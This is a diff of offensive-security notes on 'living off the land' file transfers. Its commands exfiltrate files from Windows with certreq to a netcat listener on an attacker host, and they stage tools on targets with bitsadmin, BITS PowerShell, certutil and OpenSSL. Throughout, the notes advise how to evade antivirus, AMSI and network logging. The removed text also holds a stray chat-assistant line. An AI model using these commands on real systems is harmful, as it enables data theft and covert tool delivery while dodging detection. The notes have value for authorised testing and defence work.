@@ -1,88 +1,54 @@
-## Windows File Upload
+# Living Off the Land — File Transfers
 
-Exfiltrating data from Windows targets when certreq.exe is present.,
-
-### CertReq
-
-Listener on attack host to capture file contents:
-
-```
-sudo nc -lvnp <PORT>
-```
-
-Upload local file to attack host:
-
-```
-certreq.exe -Post -config http://<ATTACK_IP>:<PORT>/ <FILE_PATH>
-```
-
-**Gotchas**
-
-- **Missing -Post parameter** on older binary versions prevents the upload function.
-- **Timeout error 0x80072ee2** may occur during the request.
+Reference sites: LOLBAS (Windows) → search `/download` or `/upload`. GTFOBins (Linux) → search `+file download` or `+file upload`.
 
 ---
 
-## Linux File Download
+## Windows LOLBins
 
-Pulling tools to Linux targets when standard web utilities are restricted and OpenSSL is available.
+Upload a file to your nc listener via certreq — POST request, file content lands in the nc session:
 
-### OpenSSL
-
-1. Generate necessary certificate on attack host:
-
+```cmd
+certreq.exe -Post -config http://<LHOST>:8000/ <FILE>
 ```
+
+```bash
+sudo nc -lvnp 8000
+```
+
+BITS download — blends into background Windows update traffic:
+
+```cmd
+bitsadmin /transfer wcb /priority foreground http://<LHOST>:8000/<FILE> <OUTPATH>
+```
+
+```powershell
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://<LHOST>:8000/<FILE>" -Destination "<OUTPATH>"
+```
+
+Certutil download — flagged by AMSI on modern Windows, use only if AV is absent/bypassed:
+
+```cmd
+certutil.exe -verifyctl -split -f http://<LHOST>:8000/<FILE>
+```
+
+> [!warning] Certutil for file transfer is detected as malicious by AMSI on all current Windows versions. BITS is significantly quieter — prefer it.
+
+---
+
+## Linux GTFOBins
+
+OpenSSL as an encrypted nc-style file server — serves a file over TLS:
+
+```bash
 openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < <FILE>
 ```
 
-2. Bind server to port and pipe file for transfer on attack host:
+Pull from the target:
 
-```
-openssl s_server -quiet -accept <PORT> -cert certificate.pem -key key.pem < <FILE_PATH>
-```
-
-3. Connect and redirect output to local file on target:
-
-```
-openssl s_client -connect <ATTACK_IP>:<PORT> -quiet > <FILE_PATH>
+```bash
+openssl s_client -connect <LHOST>:80 -quiet > <OUTFILE>
 ```
 
----
-
-## Windows File Download
-
-Tool staging on Windows targets via BITS or certificate utilities.,
-
-### BITS
-
-Download via bitsadmin CLI:
-
-```
-bitsadmin /transfer <SERVICE_NAME> /priority foreground http://<ATTACK_IP>:<PORT>/<FILE_PATH> <FILE_PATH>
-```
-
-Download via PowerShell module:
-
-```
-Import-Module bitstransfer; Start-BitsTransfer -Source "http://<ATTACK_IP>:<PORT>/<FILE_PATH>" -Destination "<FILE_PATH>"
-```
-
-### Certutil
-
-Download via certificate utility:
-
-```
-certutil.exe -verifyctl -split -f http://<ATTACK_IP>:<PORT>/<FILE_PATH>
-```
-
-**Tool comparison**
-
-- Bitsadmin -> syntax above -> prefer when foreground/background priority management is required to minimize user impact.
-- Start-BitsTransfer -> syntax above -> prefer when requiring proxy support or credential integration.
-- Certutil -> syntax above -> use as the primary wget alternative available across all Windows versions.
-
-**Gotchas**
-
-- **AMSI detection** triggers on certutil usage and will likely block the transfer.
-
-Would you like me to find more sources for Windows or Linux file transfer methods?
+> [!tip] OpenSSL transfer is encrypted in transit — useful when you need to avoid plaintext file content appearing in network logs but can't use HTTPS or SSH.
